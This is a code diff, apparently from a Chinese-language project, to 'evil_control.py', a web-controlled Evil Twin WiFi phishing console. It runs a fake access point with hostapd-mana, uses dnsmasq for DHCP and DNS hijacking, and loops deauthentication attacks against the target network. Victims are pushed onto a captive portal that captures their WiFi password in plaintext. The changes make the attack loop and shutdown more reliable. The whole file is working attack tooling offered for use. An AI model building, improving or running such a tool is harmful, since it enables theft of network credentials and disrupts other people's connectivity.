@@ -15,7 +15,7 @@ Web 界面 (默认端口 8090):
   - dnsmasq            : DHCP + DNS 劫持
 
 以 root 运行:  sudo python3 evil_control.py
-配置方式: 通过环境变量覆盖默认值（见 config.env.example）
+配置方式:通过环境变量覆盖默认值（见 config.env.example）
 """
 import os
 import re
@@ -34,6 +34,7 @@ PORTAL_PY    = f"{BASE_DIR}/portal.py"
 PASSWORDS    = f"{BASE_DIR}/passwords.txt"
 HOSTAPD_CONF = f"{BASE_DIR}/evil_auto.conf"
 DNSMASQ_CONF = f"{BASE_DIR}/dnsmasq_auto.conf"
+SSID_FILE    = f"{BASE_DIR}/current_ssid"   # portal.py 动态读取当前攻击的 SSID
 LEASES       = "/var/lib/misc/dnsmasq.leases"
 CTRL_PORT    = int(os.environ.get("EVIL_CTRL_PORT", "8090"))
 GATEWAY_IP   = os.environ.get("EVIL_GATEWAY_IP", "10.0.0.1")
@@ -54,7 +55,7 @@ for _entry in os.environ.get("EVIL_HASHES", "").split(";"):
 
 # ---------------- 状态 ----------------
 state = {
-    "mode":    "idle",        # idle | attacking | error
+    "mode":    "idle",        # idle | attacking | stopping | error
     "target":  None,          # {"ssid","bssid","channel","enc"}
     "last_target": None,      # 目标快照（停止后保留，供历史记录）
     "started": None,
@@ -64,10 +65,13 @@ state = {
     "history": [],            # [{time,pwd,device,ssid}] 验证通过的历史（跨攻击累积）
     "clients": [],            # DHCP 客户端
     "log": [],
+    "lastNote": "",           # 最近一次停止/事件说明（前端展示）
 }
 lock = threading.Lock()
 # 持续踢人循环的停止事件（验证通过自动关假 AP / 手动停止时置位）
+# 注意：每次攻击新建 Event，避免旧线程残留与新攻击竞争
 deauth_stop = threading.Event()
+deauth_thread = None   # 当前 deauth_loop 线程引用
 
 def log(msg):
     with lock:
@@ -143,6 +147,10 @@ def stop_services():
     for u in UNITS.values():
         run(f"systemctl stop {u} 2>/dev/null")
     run("systemctl reset-failed evil-dnsmasq evil-portal evil-hostapd 2>/dev/null")
+    # 兜底：直接杀残留进程，防止 systemd 单元停止失败后假 AP 仍在广播
+    run("pkill -9 -f hostapd-mana 2>/dev/null")
+    run("pkill -9 -f '^python3.*portal' 2>/dev/null")
+    run("pkill -9 -x dnsmasq 2>/dev/null")
     time.sleep(1)
 
 def deauth_loop(target, iface):
@@ -184,9 +192,10 @@ def deauth_loop(target, iface):
         deauth_stop.wait(30)
 
 def start_attack(target):
+    global deauth_stop, deauth_thread
     # 并发保护：立即锁定，防止重复点击产生多个攻击线程
     with lock:
-        if state["mode"] == "attacking":
+        if state["mode"] in ("attacking", "stopping"):
             log("已有攻击在运行，忽略重复请求")
             return -1
         state["mode"] = "attacking"
@@ -242,7 +251,7 @@ def start_attack(target):
     with open(DNSMASQ_CONF, "w") as f:
         f.write(dnsmasq_cfg)
 
-    # 5. 释放 53 端口 (systemd-resolved 占用)
+    # 5. 释放 53 端口 (systemd-resolved)
     run("systemctl stop systemd-resolved 2>/dev/null")
     time.sleep(1)
 
@@ -271,14 +280,33 @@ def start_attack(target):
     if ok < 3:
         log("警告: 有服务未启动，请查看下方日志排查")
         return ok
+    # 7b. 写入当前攻击 SSID（portal.py 动态读取显示）
+    try:
+        with open(SSID_FILE, "w") as f:
+            f.write(ssid)
+    except Exception as e:
+        log("写入 SSID 文件失败: %s" % e)
     # 8. 启动持续踢人循环（未拿到正确密码前一直踢）
-    deauth_stop.clear()
-    threading.Thread(target=deauth_loop, args=(target, IFACE), daemon=True).start()
+    #    先确保旧线程退出（如有），再新建 Event + 线程，避免竞争
+    if deauth_thread and deauth_thread.is_alive():
+        deauth_stop.set()
+        deauth_thread.join(timeout=5)
+    deauth_stop = threading.Event()
+    deauth_thread = threading.Thread(target=deauth_loop, args=(target, IFACE), daemon=True)
+    deauth_thread.start()
     return ok
 
 def stop_attack():
+    global deauth_stop, deauth_thread
     log("停止攻击，恢复环境...")
+    # 先置 stopping 状态（前端显示"正在停止"，不再恢复攻击按钮）
+    with lock:
+        if state["mode"] != "attacking":
+            state["mode"] = "idle"
+        state["mode"] = "stopping"
     deauth_stop.set()   # 停止持续踢人循环
+    if deauth_thread and deauth_thread.is_alive():
+        deauth_thread.join(timeout=10)
     stop_services()
     run("systemctl start systemd-resolved 2>/dev/null")
     ensure_managed()
@@ -290,6 +318,7 @@ def stop_attack():
         state["captured"] = []
         state["baseline"] = 0
         state["verify"] = None
+        state["lastNote"] = "已手动停止"
     log("已停止，网卡恢复 managed")
 
 def read_captured():
@@ -355,6 +384,8 @@ def auto_stop_after_verify(pwd):
     """验证通过后延迟几秒关闭假 AP（让受害者页面先显示成功）"""
     time.sleep(4)
     log("密码正确，自动关闭假 AP")
+    with lock:
+        state["lastNote"] = "密码验证通过，已自动关闭假 AP"
     stop_attack()
 
 # ---------------- Web 界面 ----------------
@@ -406,7 +437,7 @@ tr:hover td{background:#1e293b}
 <div class="wrap">
 <h1>&#x1F50D; Evil Twin 自动化钓鱼控制台</h1>
 <div class="sub">选择目标 WiFi → 一键攻击 → 受害者输密码 → 明文直接显示
-<br>访问方式：局域网 <b>http://&lt;本机IP&gt;:8090</b> · 钓鱼通道 <b>http://10.0.0.1:8090</b>（受害者连假 AP 后）</div>
+<br>访问方式：钓鱼通道 <b>http://10.0.0.1:8090</b>（受害者连假 AP 后）· 局域网 <b>http://&lt;本机IP&gt;:8090</b></div>
 
 <div class="card">
   <div class="status-line">
@@ -462,6 +493,7 @@ tr:hover td{background:#1e293b}
 
 <script>
 let sel = null;
+let stopRequested = false;   // 用户点过停止后锁定按钮，直到服务真正停止
 const $ = id => document.getElementById(id);
 
 async function api(path, opts) {
@@ -532,13 +564,17 @@ async function doAttack() {
     setDot('error', '请求失败: ' + e.message);
     $('attackBtn').disabled = false; $('attackBtn').textContent = '&#x26A1; 开始攻击';
   }
+  // 按钮状态由 poll() 统一管理
 }
 
 async function doStop() {
-  setDot('idle', '正在停止...');
-  const d = await api('/api/stop', {method: 'POST'});
+  stopRequested = true;             // 锁定按钮，poll 不会再重新启用
   $('stopBtn').disabled = true;
-  setDot('idle', '已停止');
+  $('stopBtn').textContent = '正在停止...';
+  setDot('idle', '正在停止攻击，恢复环境...');
+  try {
+    await api('/api/stop', {method: 'POST'});
+  } catch (e) { /* 后端会继续执行，状态由 poll 同步 */ }
 }
 
 async function poll() {
@@ -597,15 +633,27 @@ async function poll() {
     if (d.mode === 'attacking') {
       $('attackBtn').disabled = true;
       $('attackBtn').textContent = '&#x26A1; 攻击进行中...';
-      $('stopBtn').disabled = false;
-    } else if (d.mode === 'idle') {
+      $('stopBtn').disabled = stopRequested;   // 用户点过停止则保持禁用
+      if (stopRequested) $('stopBtn').textContent = '正在停止...';
+      else $('stopBtn').textContent = '&#x23F9; 停止攻击';
+    } else if (d.mode === 'stopping') {
+      $('attackBtn').disabled = true;
+      $('attackBtn').textContent = '&#x23F3; 正在停止...';
       $('stopBtn').disabled = true;
+      $('stopBtn').textContent = '正在停止...';
+      setDot('idle', '正在停止攻击，恢复环境...');
+    } else if (d.mode === 'idle') {
+      stopRequested = false;
+      $('stopBtn').disabled = true;
+      $('stopBtn').textContent = '&#x23F9; 停止攻击';
       if (sel) {
         $('attackBtn').disabled = false;
         $('attackBtn').textContent = '&#x26A1; 开始攻击';
       }
       if (d.verify && d.verify.state === 'ok' && d.verify.verified) {
         setDot('idle', '攻击已结束：密码验证通过，假 AP 已关闭');
+      } else if (d.lastNote) {
+        setDot('idle', d.lastNote);
       }
     }
   } catch (e) { /* ignore */ }
@@ -650,6 +698,7 @@ class Handler(BaseHTTPRequestHandler):
                     "verify": state["verify"],
                     "log": list(state["log"]),
                     "clients": read_clients(),
+                    "lastNote": state.get("lastNote", ""),
                 }
             st["captured"] = read_captured() if state["mode"] == "attacking" else []
             with lock:
@@ -671,7 +720,7 @@ class Handler(BaseHTTPRequestHandler):
             except Exception:
                 pass
         if path == "/api/start":
-            if state["mode"] == "attacking":
+            if state["mode"] in ("attacking", "stopping"):
                 self.send_json({"ok": False, "error": "已有攻击在运行，请先停止"})
                 return
             ssid = data.get("ssid", "").strip()
